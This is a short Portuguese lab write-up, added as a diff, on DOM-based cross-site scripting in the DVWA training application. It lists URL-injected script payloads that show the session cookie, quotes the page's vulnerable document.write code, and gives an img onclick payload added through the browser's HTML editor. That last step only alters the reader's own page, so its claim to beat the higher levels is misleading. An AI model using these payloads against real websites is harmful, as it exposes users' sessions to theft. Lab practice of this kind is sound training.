@@ -1,0 +1,69 @@
+XSS DOM DVWA
+
+LOW
+
+1 = Primeiro clique em select para selecionar o idioma
+
+http://10.60.4.63/DVWA/vulnerabilities/xss_d/?default=English
+
+Em seguida retire o nome "English" e adicione o código js <script>alert('Hello Brandon XSS')</script> 
+
+http://10.60.4.63/DVWA/vulnerabilities/xss_d/?default=<script>alert('Hello Brandon XSS')</script>
+
+2 = Em seguida vamos tenta visualizar os cookies com o comando 
+
+http://10.60.4.63/DVWA/vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script>
+
+security=low; PHPSESSID=8lni4d18vd7b1t6t3u8a862rhg
+
+
+===============================================================================================
+
+MEDIUM and HARD
+
+1 = Vá na opção do idioma,e  clique em inspecionar:
+
+<form name="XSS" method="GET">
+    <select name="default">
+        <script>
+            if (document.location.href.indexOf("default=") >= 0) {
+                var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
+                document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
+                document.write("<option value='' disabled='disabled'>----</option>");
+            }
+                
+            document.write("<option value='English'>English</option>");
+            document.write("<option value='French'>French</option>");
+            document.write("<option value='Spanish'>Spanish</option>");
+            document.write("<option value='German'>German</option>");
+        </script>
+        
+        <option value="" disabled="disabled">----</option>
+        <option value="English">English</option>
+        <option value="French">French</option>
+        <option value="Spanish">Spanish</option>
+        <option value="German">German</option>
+
+    </select>
+    <input type="submit" value="Select">
+<img src="http://icons.iconseeker.com/png/fullsize/black-glossy/downloads-42.png" onclick="alert(document.cookie)">
+</form>
+
+2 = Em seguida em form clique botão direito e depois "Edit as HTML"
+
+E acima de </form> digite
+
+<img src="http://icons.iconseeker.com/png/fullsize/black-glossy/downloads-42.png" onclick="alert(document.cookie)">
+
+como no exemplo do código em HTML acima.
+
+Resultado:
+
+security=medium; PHPSESSID=8lni4d18vd7b1t6t3u8a862rhg
+
+security=high; PHPSESSID=ecoe8k8l2b7pvj0cmmtcvjac3v
+
+===============================================================================================
+
+
+
